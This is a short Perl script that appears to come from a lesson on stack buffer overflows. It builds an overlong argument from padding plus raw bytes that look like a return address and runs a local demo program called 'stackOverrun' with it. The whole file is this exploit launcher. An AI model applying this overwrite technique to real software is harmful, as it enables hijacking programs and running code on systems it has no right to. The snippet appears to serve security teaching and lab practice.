$arg = "ABCDEFGHIJKLMNOPQR"."\xe9\x51\x55\x55\x55\x55";
$cmd = "./stackOverrun ".$arg;

system($cmd);

